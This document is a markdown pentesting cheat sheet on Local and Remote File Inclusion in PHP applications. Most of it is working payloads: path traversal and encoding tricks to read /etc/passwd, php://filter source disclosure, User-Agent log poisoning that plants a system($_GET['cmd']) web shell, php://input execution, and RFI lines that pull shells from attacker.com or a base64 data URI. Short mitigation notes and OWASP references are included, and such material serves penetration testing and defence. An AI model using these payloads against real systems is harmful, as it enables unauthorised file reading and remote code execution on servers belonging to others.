# Local & Remote File Inclusion

File Inclusion vulnerabilities occur when an application dynamically loads files based on
user-controlled input without proper validation — leading to source disclosure, code
execution, or server-side request forgery.

---

## Local File Inclusion (LFI)

**Category:** LFI / Information Disclosure
**Severity context:** High to Critical — read arbitrary server files, and with chaining,
often leads to RCE.

### How to identify it
Look for parameters that reference files: `file=`, `page=`, `template=`, `include=`,
`load=`, `document=`, `dir=`, `path=`. Submit a known server file like `/etc/passwd` to
check if the content is returned. Wrap with `../` traversal sequences if the app prepends
a directory.

### How it works
The application uses a filesystem function (`include()`, `require()`, `file_get_contents()`,
`readfile()`, `file()`) with input that is not restricted to an allow-list. By injecting
path traversal or absolute paths, you can read any file the web server process has access to.

### Exploitation
```bash
# Basic path traversal
?file=../../../etc/passwd
?file=../../../../etc/passwd
?file=../../../../../etc/passwd

# Absolute path (bypasses prepended directory)
?file=/etc/passwd

# URL encoding
?file=..%2f..%2f..%2fetc/passwd
?file=..%252f..%252f..%252fetc/passwd      # double URL encoding

# Null byte injection (PHP < 5.3.4)
?file=../../../etc/passwd%00

# Bypass appended extension (.php)
?file=../../../etc/passwd%00       # null byte
?file=../../../etc/passwd/.        # dangling /. → ignored by some systems
?file=../../../etc/passwd%20       # space → truncated
?file=../../../etc/passwd?foo      # query → some wrappers strip
?file=PHP://filter/... (see below) # wrappers bypass extension

# PHP wrappers for code execution
?file=php://filter/convert.base64-encode/resource=index.php          # source disclosure
?file=php://filter/convert.base64-encode/resource=../../../etc/passwd

# Log poisoning → RCE
# 1. Inject PHP code into User-Agent
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://target.com/
# 2. Include the access log
?file=../../../var/log/apache2/access.log&cmd=id
# 3. Alternative log locations:
#    /var/log/apache/access.log, /var/log/httpd/access.log,
#    /var/log/nginx/access.log, /proc/self/environ

# /proc/self/environ (if readable — reveals env vars, can inject via UA)
?file=../../../proc/self/environ

# PHP input wrapper (POST data becomes file content) — requires allow_url_include=On
curl -X POST -d "<?php system('id'); ?>" "http://target.com/?file=php://input"
```

### Example
```
Vulnerable URL:  http://target.com/index.php?page=about.php
Payload:         http://target.com/index.php?page=../../../etc/passwd
Response:        root:x:0:0:root:/root:/bin/bash
```

### Mitigation
Never pass user input directly to filesystem functions. Use a strict allow-list of
valid filenames or numeric IDs mapped server-side. Disable dangerous PHP configs:
`allow_url_include = Off`, `allow_url_fopen = Off`.

### References
- [OWASP: File Inclusion](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
- [PayloadsAllTheThings: LFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)

---

## Remote File Inclusion (RFI)

**Category:** RFI / RCE
**Severity context:** Critical — straight to code execution if `allow_url_include` is on.

### How to identify it
Same parameter patterns as LFI, but you additionally test whether the application will
fetch a remote URL. Submit a URL to a file you control (a PHP shell on your server).
If the response includes your code or executes it, RFI is confirmed.

### How it works
If the application uses `include()` / `require()` with user input and `allow_url_include`
is enabled (PHP), the function will fetch a remote file over HTTP/FTP and execute its
contents as PHP. This gives immediate RCE.

### Exploitation
```bash
# Basic RFI — point at a PHP shell hosted on your server
?file=http://attacker.com/shell.txt
?file=http://attacker.com/cmd.php
?file=http://attacker.com/shell.php%00     # null byte to strip appended extension

# FTP wrapper
?file=ftp://attacker.com/shell.txt

# Data URI scheme (if allow_url_include=On) — no external server needed
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2BCg%3D%3D
# Decodes to: <?php system($_GET['cmd']); ?>

# Bypass URL filtering — double protocol
?file=http://http://attacker.com/shell.txt

# Parameter pollution
?file=about.php&file=http://attacker.com/shell.txt
```

### Mitigation
Set `allow_url_include = Off` in `php.ini` (should never be On in production).
Use allow-list-based file inclusion instead of dynamic paths. Configure egress firewall
to block outbound HTTP/FTP from the web server unless explicitly needed.

### References
- [OWASP: Remote File Inclusion](https://owasp.org/www-community/attacks/Remote_File_Inclusion_(RFI))
- [PayloadsAllTheThings: RFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#remote-file-inclusion)
